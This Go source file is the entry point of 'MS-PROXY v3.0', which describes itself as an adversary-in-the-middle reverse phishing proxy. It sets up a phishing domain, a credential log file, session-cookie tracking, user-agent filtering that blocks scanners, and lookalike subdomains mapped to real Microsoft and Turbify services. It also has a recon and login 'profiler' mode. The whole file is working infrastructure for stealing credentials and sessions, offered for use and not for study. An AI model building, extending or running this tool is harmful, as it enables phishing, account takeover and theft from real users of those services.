package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

func main() {
	// Profiler mode:
	//   ms-proxy -profile -domain <domain> [-key <k>] [-user <u> -pass <p>] [-headful]
	// Static recon always runs; -user/-pass add the dynamic (headless) phase.
	if len(os.Args) >= 2 && os.Args[1] == "-profile" {
		runProfiler(os.Args[2:])
		return
	}

	// Initialize subsystems
	initSessionManager()
	initTargets()
	initGeoIP() // ← add: load MaxMind DBs
	initCorrelator()

	mux := http.NewServeMux()
	mux.HandleFunc("/", mainHandler)

	server := &http.Server{
		Addr:         listenAddr,
		Handler:      mux,
		ReadTimeout:  45 * time.Second,
		WriteTimeout: 45 * time.Second,
	}

	printBanner()

	log.Printf("[*] Listening on %s", listenAddr)
	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("[!] Server error: %v", err)
	}
}

func printBanner() {
	fmt.Println("══════════════════════════════════════════════════════")
	fmt.Println("  MS-PROXY v3.0 — Chameleon AiTM Reverse Proxy")
	fmt.Println("  Architecture: NOSCAMLIKEME (decompress → modify → compress)")
	fmt.Println("══════════════════════════════════════════════════════")
	fmt.Printf("  Listen:   %s\n", listenAddr)
	fmt.Printf("  Domain:   %s\n", phishDomain)
	fmt.Printf("  Cred log: %s\n", credLogFile)
	fmt.Printf("  Sessions: enabled (cookie: %s)\n", sessionMgr.cookieName)
	fmt.Printf("  Filter:   %d blocked UA patterns\n", len(blockedUAPatterns))
	fmt.Println("──────────────────────────────────────────────────────")
	fmt.Printf("  Targets:  %d configured\n\n", len(targets))

	for key, t := range targets {
		// Find the entry URL
		entry := "https://" + t.EntrySubdomain
		fmt.Printf("  [%s] %s\n", key, t.Name)
		fmt.Printf("    Entry: %s\n", entry)
		for sub, real := range t.HostMap {
			fmt.Printf("    %-32s → %s\n", sub, real)
		}
		fmt.Println()
	}

	fmt.Println("══════════════════════════════════════════════════════")
	fmt.Println()
}

// extractTargetKey returns the target key from a host string
// e.g. "micro.noscamlike.me" → "microsoft"
// e.g. "mail.noscamlike.me" → "turbify"
func extractTargetKey(host string) string {
	for key, t := range targets {
		for sub := range t.HostMap {
			if strings.EqualFold(host, sub) {
				return key
			}
		}
	}
	return "microsoft"
}
